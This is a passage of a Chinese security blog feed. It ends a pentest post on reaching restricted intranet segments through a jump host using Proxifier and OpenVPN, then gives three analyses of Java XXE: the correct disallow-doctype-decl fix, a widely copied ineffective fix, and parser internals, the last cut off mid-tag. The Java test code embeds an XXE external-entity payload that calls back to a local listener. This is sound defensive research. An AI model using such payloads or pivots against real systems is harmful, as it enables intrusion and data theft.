id="4-2-笔记本配置"><a href="#4-2-笔记本配置" class="headerlink" title="4.2 笔记本配置"></a>4.2 笔记本配置</h3><p>在本机使用Proxifier将需要代理的工具设置好代理，当然如果该工具有代理功能就不用了。</p><p><img src="/articles/2019/break-through-lan-segment-limit/add-socks5-server.png" alt="添加代理服务器"></p><p><img src="/articles/2019/break-through-lan-segment-limit/add-proxy-rules.png" alt="添加代理规则"></p><h3 id="4-3-方案缺点"><a href="#4-3-方案缺点" class="headerlink" title="4.3 方案缺点"></a>4.3 方案缺点</h3><ol><li>渗透中需要使用的工具，我们得一一为它们设置好代理，比较繁琐。</li><li>有些工具，你为它设置代理后，依然不能用，比如nmap。</li></ol><p>下个方案我们来解决这些问题。</p><h2 id="0x05-方案四：VPN"><a href="#0x05-方案四：VPN" class="headerlink" title="0x05 方案四：VPN"></a>0x05 方案四：VPN</h2><p>以上方案，优点很明显，缺点也很明显。为了实现对目标站点的全端口渗透无疑最好的方案是将跳板服务器搭建成VPN服务器了，然后笔记本直接通过VPN来访问目标站点，其他无需设置。即可使得所有工具都能访问到目标站点服务器的所有端口。</p><h3 id="5-1下载安装"><a href="#5-1下载安装" class="headerlink" title="5.1下载安装"></a>5.1下载安装</h3><p>去官网下载OpenVPN(我下载是openvpn-install-2.3.10-I601-x86_64.exe)，并在客户端和服务器按照以下同样的方式安装OpenVPN。安装过程没啥好说的，主要注意到以下这一步时，要选择红方框中的两个选项，不然安装完无法使用命令行制作证书。</p><p><img src="/articles/2019/break-through-lan-segment-limit/install-setting.png" alt="OpenVPN安装时需要选择的两项"></p><p>安装完成后系统会多出一张网卡TAP-Windows Adapter V9。</p><h3 id="5-2-系统设置"><a href="#5-2-系统设置" class="headerlink" title="5.2 系统设置"></a>5.2 系统设置</h3><p>设置跳板服务器用于访问目标站点的网卡共享给OpenVPN的虚拟网卡<code>TAP-Windows Adapter V9</code>，这步很重要！</p><p><img src="/articles/2019/break-through-lan-segment-limit/shared-network-card.png" alt="设置网卡共享"></p><p>网上说需要修改注册表，测试发现不改也行，这里做个记录，说不定有的环境需要。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters</span><br><span class="line">将IPEnableRouter改为1</span><br></pre></td></tr></table></figure><h3 id="5-3-生成VPN证书"><a href="#5-3-生成VPN证书" class="headerlink" title="5.3 生成VPN证书"></a>5.3 生成VPN证书</h3><p><strong>&lt;1&gt; 初始化配置</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">init-config</span><br></pre></td></tr></table></figure><p><strong>&lt;2&gt; 复制配置文件为批处理</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vars</span><br></pre></td></tr></table></figure><p><strong>&lt;3&gt; 清除key文件夹内的文件,文件夹不存在会自动创建</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clean-all</span><br></pre></td></tr></table></figure><p><strong>&lt;4&gt; 生成证书及key，需要填写一些参数，建议不要默认</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">build-ca</span><br></pre></td></tr></table></figure><p><strong>&lt;5&gt; 创建服务端证书及key，需要填写一些参数，建议不要默认，一路选y</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">build-key-server server</span><br></pre></td></tr></table></figure><p><strong>&lt;6&gt; 创建一个客户端证书及key，需要填写一些参数，建议不要默认,一路选y</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">build-key client</span><br></pre></td></tr></table></figure><p><strong>&lt;7&gt; 生成1024bit的key（pem文件），并结束此次创建</strong></p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">build-dh</span><br></pre></td></tr></table></figure><p>将新生成的<code>keys</code>目录下所有文件，全部拷贝到服务器OpenVPN的config目录下，<br>将keys目录下的<code>client1.crt</code>,<code>client1.key</code>和<code>ca.crt</code>复制到客户端的OpenVPN的config目录下。</p><h3 id="5-4-编写服务端和客户端连接配置文件"><a href="#5-4-编写服务端和客户端连接配置文件" class="headerlink" title="5.4 编写服务端和客户端连接配置文件"></a>5.4 编写服务端和客户端连接配置文件</h3><p>在服务器上，在OpenVPN的sample-config目录下复制一个<code>server.ovpn</code>配置模板文件，到config目录。以下列举的为需要修改的配置项，其他可以使用默认配置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># VPN服务器的地址</span></span><br><span class="line">local <span class="number">192.168</span><span class="number">.149</span><span class="number">.140</span></span><br><span class="line"><span class="comment"># 使用tcp协议</span></span><br><span class="line">proto tcp</span><br><span class="line"><span class="comment"># 将目标站点所在的网段，写成路由推送给VPN客户端</span></span><br><span class="line">push <span class="string">"route 10.0.3.0 255.255.255.0"</span></span><br><span class="line"><span class="comment"># 给VPN客户端推送的DNS（在内网一般不用写）</span></span><br><span class="line">push <span class="string">"dhcp-option DNS 114.114.114.114"</span></span><br><span class="line"><span class="comment"># build-dh命令生成的是1024位的pem文件</span></span><br><span class="line">dh dh1024.pem</span><br></pre></td></tr></table></figure><p>在客户端，在OpenVPN的<code>sample-config</code>目录下复制一个<code>client.ovpn</code>配置模板文件，到<code>config</code>目录。以下列举的为需要修改的配置项，其他可以使用默认配置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 远程VPN服务器地址</span></span><br><span class="line">remote <span class="number">192.168</span><span class="number">.149</span><span class="number">.140</span> <span class="number">1194</span></span><br><span class="line"><span class="comment"># 使用TCP协议，与服务端相同</span></span><br><span class="line">proto tcp</span><br></pre></td></tr></table></figure><p>最后先启动服务器端，右键托盘图标&gt;connect，小图标变绿色代表启动成功，若不成功可以查看下log日志，排查下原因。然后再启动客户端，操作一致。</p><h3 id="5-5-方案缺点"><a href="#5-5-方案缺点" class="headerlink" title="5.5 方案缺点"></a>5.5 方案缺点</h3><p>配置相对比较繁琐。</p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>这些方案我特意选择了比较简单易用的软件，并作了一个记录。方便自己某时需要，能快速突破限制，节省渗透时间。同时解决方案中推荐的软件在Linux上也有，搭建的方式类似。每个方案有优点也有缺点，大家要看自己在现场的实际需求来选择！</p><h2 id="0x07-参考文章"><a href="#0x07-参考文章" class="headerlink" title="0x07 参考文章"></a>0x07 参考文章</h2><ul><li><a href="https://www.librehat.com/three-minutes-to-set-up-shadowsocks-server-on-windows/" target="_blank" rel="noopener">Windows下三分钟搭建Shadowoscks服务器端</a></li><li><a href="https://www.i5seo.com/shadowsocks-sock5-pac-vpn-difference-between.html" target="_blank" rel="noopener">Shadowsocks（Sock5代理）的PAC模式与全局模式与VPN的区别</a></li><li><a href="http://www.fyluo.com/m/?post=198" target="_blank" rel="noopener">OpenVPN Windows 平台安装部署教程</a></li><li><a href="https://www.landui.com/help/show-3871.html" target="_blank" rel="noopener">windows下利用OpenVPN搭建VPN服务器</a></li><li><a href="https://www.cnblogs.com/lidabo/p/7027463.html" target="_blank" rel="noopener">OpenVPN 安装、配置客户端和服务端，以及OpenVPN的使用 (Windows 平台)</a></li><li><a href="https://www.cnblogs.com/EasonJim/p/9657039.html" target="_blank" rel="noopener">OpenVPN搭建中tap与tun的实际使用区别</a></li><li><a href="http://blog.shell909090.org/blog/archives/2724/" target="_blank" rel="noopener">openvpn的几种基本模式</a></li><li><a href="https://www.ilanni.com/?p=9847" target="_blank" rel="noopener">烂泥：openvpn配置文件详解</a></li><li><a href="https://www.ilanni.com/?p=9877" target="_blank" rel="noopener">烂泥：openvpn tun模式下客户端与内网机器通信</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在内网做渗透测试时，常常遇到访问策略限制，无法直接访问渗透目标。本文算是记录下我上一年的几个解决方案。&lt;/p&gt;
&lt;h2 id=&quot;0x01-场景说明&quot;&gt;&lt;a href=&quot;#0x01-场景说明&quot; class=&quot;headerlink&quot; title=&quot;0x01 场景说明&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://gv7.me/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>Java XXE漏洞正确修复方法及原理</title>
    <link href="http://gv7.me/articles/2019/java-xxe-bug-fix-right-and-principle/"/>
    <id>http://gv7.me/articles/2019/java-xxe-bug-fix-right-and-principle/</id>
    <published>2019-02-20T17:18:49.000Z</published>
    <updated>2019-02-20T18:51:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>前两周我们搞明白了XXE漏洞在Java语言中的深层原理，以及错误修复方案为何无法防御XXE的原理。今天我们来解决最后一个问题： <strong>Java中如何正确防御XXE，同时它为何能防御呢？</strong></p><p>OWASP推荐的修复代码如下，号称是可以防御几乎所有XXE攻击！今天我们来深入研究下它为何可以防御XXE漏洞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><h2 id="0x01-测试代码"><a href="#0x01-测试代码" class="headerlink" title="0x01 测试代码"></a>0x01 测试代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.ParserConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DOMXXEFix</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ParserConfigurationException,SAXException,Exception</span>&#123;</span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">                    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:1664\"&gt;\n"</span> +</span><br><span class="line">                    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">            InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">            Document doc = db.parse(is);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时使用以下命令,在本地启动一个监听1664端口的Web服务器，用于检测XXE漏洞是否被触发了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 1664</span><br></pre></td></tr></table></figure><h2 id="0x02-原理分析"><a href="#0x02-原理分析" class="headerlink" title="0x02 原理分析"></a>0x02 原理分析</h2><p>在测试代码<code>dbf.setFeature(...);</code>处打断点，开始调式跟踪。</p><p><code>dbf.setFeature()</code>方法会调用多个对象的<code>setFeature()</code>方法，最终到达<code>XMLDocumentScannerImpl</code>对象<code>setFeature()</code>方法，调用链如下：</p><p><img src="/articles/2019/java-xxe-bug-fix-right-and-principle/setFeature_invocation_list.png" alt="setFeature方法调用链"></p><p>在XMLDocumentScannerImpl.setFeature()中，将<code>fDisallowDoctype</code>属性设置为了<code>true</code>。</p><p><img src="/articles/2019/java-xxe-bug-fix-right-and-principle/XMLDocumentScannerImpl_fDisallowDoctype_false.png" alt="fDisallowDoctype属性被设置为true"></p><p>在这些XML解析器完成设置后，解析器会调用<code>XMLDocumentScannerImpl.scanDocument()</code>对XML的文档进行扫描。在解析器读到<code>DOCTYPE</code>字符串时，扫描状态会被设置为<code>SCANNER_STATE_DOCTYPE</code>。解析器会进入<code>SCANNER_STATE_DOCTYPE</code>阶段。</p><p><img src="/articles/2019/java-xxe-bug-fix-right-and-principle/setScannerState_SCANNER_STATE_DOCTYPE.png" alt="扫描状态会被设置为SCANNER_STATE_DOCTYPE"></p><p>该阶段会首先判断<code>fDisallowDoctype</code>的值，由上面的跟踪可知<code>fDisallowDoctype</code>已经被改为<code>true</code>，所以会调用<code>reportFatalError()</code>方法，输出致命错误报告并向上抛出解析异常。</p><p><img src="/articles/2019/java-xxe-bug-fix-right-and-principle/reportFatalError.png" alt="输出致命错误报告并向上抛出解析异常"></p><p>异常会被抛到<code>XML11Configuration.parse()</code>中处理。处理的结果是<code>fParseInProgress</code>变量被设置为了<code>false</code>，接着会调用<code>cleanup()</code>方法在完全解析XML文档之前终止解析，释放解析期间分配的任何资源。所以程序不会运行到漏洞触发处。</p><p><img src="/articles/2019/java-xxe-bug-fix-right-and-principle/fParseInProgress_false.png" alt="终止解析XML"></p><p>最终运行结果如下，Web服务器也并未收到Http请求。</p><p><img src="/articles/2019/java-xxe-bug-fix-right-and-principle/result.png" alt="最终运行结果"></p><h2 id="0x03-参考文章"><a href="#0x03-参考文章" class="headerlink" title="0x03 参考文章"></a>0x03 参考文章</h2><ul><li><a href="https://mp.weixin.qq.com/s/sGcaDCokVxhELd63-0TmIw" target="_blank" rel="noopener">Java XXE注入修复问题填坑实录</a></li><li><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前两周我们搞明白了XXE漏洞在Java语言中的深层原理，以及错误修复方案为何无法防御XXE的原理。今天我们来解决最后一个问题： &lt;strong&gt;Java中如何正确防御XXE，同时它为何能防御呢？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;OWASP推荐的修复代码如下，号称是可以防御几
      
    
    </summary>
    
      <category term="漏洞原理" scheme="http://gv7.me/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
    
      <category term="XXE" scheme="http://gv7.me/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>一个被广泛流传的XXE漏洞错误修复方案</title>
    <link href="http://gv7.me/articles/2019/a-widely-circulated-xxe-bug-fix/"/>
    <id>http://gv7.me/articles/2019/a-widely-circulated-xxe-bug-fix/</id>
    <published>2019-02-14T07:09:07.000Z</published>
    <updated>2019-11-01T07:02:26.759Z</updated>
    
    <content type="html"><![CDATA[<p>现在百度”XXE漏洞修复”，搜索到的Java语言修复方案大部分如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>经过实际的测试发现<code>setExpandEntityReferences(false)</code>根本无法防御XXE漏洞！不禁思考到两个问题：</p><ol><li>setExpandEntityReferences为何无法防御XXE？</li><li>为何一个无法防御的方案，却广为流传？</li></ol><p>上一周我们深入Java内置XML解析器中，研究XXE漏洞的深层原理。这周我们在这个基础上，进一步弄清以上两个问题。</p><h2 id="0x01-测试代码"><a href="#0x01-测试代码" class="headerlink" title="0x01 测试代码"></a>0x01 测试代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.*;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DOMXXETest02</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ParserConfigurationException,SAXException,Exception</span>&#123;</span><br><span class="line">        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">        dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br><span class="line">        DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">        String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">                        <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:1664/test.dtd\"&gt;\n"</span> +</span><br><span class="line">                    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">        InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">        Document doc = db.parse(is);</span><br><span class="line">        System.out.println(doc.getElementsByTagName(<span class="string">"doc"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test by c0ny1</span><br></pre></td></tr></table></figure><h2 id="0x02-原理分析"><a href="#0x02-原理分析" class="headerlink" title="0x02 原理分析"></a>0x02 原理分析</h2><p>我们在<code>dbf.setExpandEntityReferences(false);</code>打断点开始分析！</p><p>setExpandEntityReferences(false)会将DocumentBuilderFactory对象中的expandEntityRef属性默认值true修改为false。</p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/1.png" alt></p><p>在newDocumentBuilder()会方法返回一个DocumentBuilderImpl对象前，会在DocumentBuilderImpl对象初始化时，调用setFeature()方法对DOM解析器的<code>CREATE_ENTITY_REF_NODES_FEATURE</code>(<a href="http://apache.org/xml/features/dom/create-entity-ref-nodes" target="_blank" rel="noopener">http://apache.org/xml/features/dom/create-entity-ref-nodes</a>) 配置项设置为上一步的expandEntityRef变量的相反值true。</p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/2.png" alt></p><p>domParser.setFeature()最终会调用解析器配置对象设置目标配置项的值。</p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/3.png" alt></p><p>在XMLParser对象调用reset()方法重置状态时，AbstractDOMParser对象中通过解析器的配置对象获取到<code>CREATE_ENTITY_REF_NODES</code>（<a href="http://apache.org/xml/features/dom/create-entity-ref-nodes）" target="_blank" rel="noopener">http://apache.org/xml/features/dom/create-entity-ref-nodes）</a> 配置项的值true，并将<code>fCreateEntityRefNodes</code>属性设置为true。</p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/4.png" alt></p><p>在XMLDocumentFragmentScannerImpl.scanDocument()进入<code>START_ELEMENT</code>阶段后，next()方法会对XML中的元素进行扫描。当扫描到文本中的<code>&amp;</code>字符时（识别一般实体），解析器会调用scanEntityReference() 扫描实体引用。最后会调用setupCurrentEntity()创建连接并发起请求，以获取外部实体的内容，这时XXE漏洞将会触发！可以发现程序运行流程，依然会执行到XXE漏洞触发的位置。</p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/5.png" alt></p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/6.png" alt></p><p>继续跟踪，<code>AbstractDOMParser.endGeneralEntity()</code>在判断<code>fCreateEntityRefNodes</code>为<code>false</code>时，实体引用&amp;xxe将会被从DOM树删除，引用的具体内容<code>Test by c0ny1</code>将会在DOM树中展开,替换掉&amp;xxe。此时为<code>true</code>，实体引用节点将保留在DOM树中。这是setExpandEntityReferences方法对XML解析器处理XML最终产生影响的位置。</p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/7.png" alt></p><p>最终调用链如下：</p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/8.png" alt></p><p>经过以上分析，我们大致了解了setExpandEntityReferences()方法的功能是对解析XML生成的Document文档进行设置，设置为 true则展开实体引用到生成的文档中替换掉<code>&amp;xxx</code>的实体引用声明，设置为false则保留实体引用声明的DOM树在生成的文档中。</p><p>由于setExpandEntityReferences(false)对Java内置XML解析器的设置起作用前，解析器就已经发起了对外部实体的请求了，故无法防御XXE漏洞！</p><h2 id="0x03-思考原因"><a href="#0x03-思考原因" class="headerlink" title="0x03 思考原因"></a>0x03 思考原因</h2><p>为何setExpandEntityReferences明明无法防御XXE漏洞，但却很多人在使用呢？当我看了官方JDK API文档之后，发现描述过于简单，从字面上理解很容易与方法的实际功能存在偏差。</p><p><img src="/articles/2019/a-widely-circulated-xxe-bug-fix/9.png" alt></p><p>初步判断有两个原因：</p><ol><li><p>官方文档的描述太过于模糊，很容易让人产生歧义。如果没有跟踪该方法底层实现很容易对它的实际功能理解错误，从而导致错误使用。</p></li><li><p>第一批修复的人应该是看了官方JDK文档来编写修复代码的，之后更多的人是直接百度到了一批人的编写的错误修复代码，直接复制粘贴。导致这个错误的修复方案进一步蔓延。</p></li></ol><h2 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h2><ul><li><a href="https://mp.weixin.qq.com/s/sGcaDCokVxhELd63-0TmIw" target="_blank" rel="noopener">Java XXE注入修复问题填坑实录</a></li><li><a href="https://mp.weixin.qq.com/s/bTeJYzUN9T1u-KDZON5FiQ" target="_blank" rel="noopener">修不好的洞，JDK的坑——从WxJava XXE注入漏洞中发现了一个对JDK的误会</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;现在百度”XXE漏洞修复”，搜索到的Java语言修复方案大部分如下：&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;
      
    
    </summary>
    
      <category term="漏洞分析" scheme="http://gv7.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="XXE" scheme="http://gv7.me/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>探究Java中XXE漏洞的深层原理</title>
    <link href="http://gv7.me/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/"/>
    <id>http://gv7.me/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/</id>
    <published>2019-02-07T13:30:12.000Z</published>
    <updated>2019-02-16T17:57:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间微信支付JDK又出现了XXE漏洞，原因是对前一个XXE漏洞没有修复成功。细思深层原因，是因为对Java JDK提供的API函数理解不正确，导致误用函数进行防御。我不禁思考了以下问题:</p><p>1.Java中XXE漏洞的深层原理是什么？</p><p>2.以下代码为何无法防御XXE？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory.setExpandEntityReferences(<span class="keyword">false</span>)</span><br></pre></td></tr></table></figure><p>3.以下代码为何能够防御XXE？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>,<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure><p>要弄清以上问题，我们必须深入到Java内置解析器中去一探究竟。于是我打算从JDK代码层面去跟踪解析器执行的每一步操作。接下来我会用三周的文章弄清这三个问题，本周先来弄清第一个。</p><h2 id="0x01-测试代码"><a href="#0x01-测试代码" class="headerlink" title="0x01 测试代码"></a>0x01 测试代码</h2><p>Java常用解析XML的方式有DOM，SAX，JDOM和DOM4j。我编写了4种方式的XXE漏洞测试代码，运行发现，漏洞触发点都是一样的。</p><p><img src="/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/testcode.png" alt="测试代码"></p><p>说明这4种解析方式底层实现调用的API函数都是一样的。这里我选择DOM这种最常规的方式来举例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.*;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DOMXXETest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> ParserConfigurationException,SAXException,Exception</span>&#123;</span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            String str = <span class="string">"&lt;!DOCTYPE doc [ \n"</span> +</span><br><span class="line">                    <span class="string">"&lt;!ENTITY xxe SYSTEM \"http://127.0.0.1:1664\"&gt;\n"</span> +</span><br><span class="line">                    <span class="string">"]&gt;&lt;doc&gt;&amp;xxe;&lt;/doc&gt;"</span>;</span><br><span class="line">            InputStream is = <span class="keyword">new</span> ByteArrayInputStream(str.getBytes());</span><br><span class="line">            Document doc = db.parse(is);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以在公众号回复”Java XXE漏洞测试代码”，获取所有测试代码下载地址。</p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>随着Java不断的成熟，它内置的解析器也越来越复杂，这里我们只挑和XXE漏洞相关的核心操作来说明。</p><p>由于所有解析方式都调用了XMLParser类来对XML文档进行解析。故我们从该对象的解析函数Parser开始跟踪。</p><p>XMLParser类会调用XML11Configuration类来解析XML文档的配置。而XML11Cofiguration类又会调用XMLDocumentFragmentScannerImpl类的scanDocument()对XML文档片段的结构和内容进行扫描。</p><p><img src="/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/scanDocument.png" alt></p><p>scanDocument方法会先扫描XML的Document部分（START_DOCUMENT阶段），然后在扫描Document中的DTD（DTD阶段），当文档扫描器完成DTD的扫描后，进入<code>START_ELEMENT</code>阶段.</p><p><img src="/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/scanDocument1.png" alt></p><p>这时next()方法会对XML中的元素进行扫描。当扫描到文本中的<code>&amp;</code>字符时（识别一般实体），将状态置为<code>SCANNER_STATE_REFERENCE</code>。</p><p><img src="/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/SCANNER_STATE_REFERENCE.png" alt="将扫描状态改为SCANNER_STATE_REFERENCE"></p><p>在引用扫描状态下，解析器会调用scanEntityReference() 扫描实体引用。</p><p><img src="/articles/2019/study-the-deep-principle-of-xxe-vulnerability-in-java/scanEntityReference.png" alt></p><p>其中将调用XMLEntityManager的startEntity()将应用程序定义的XML实体流插入解析流。</p><p><img 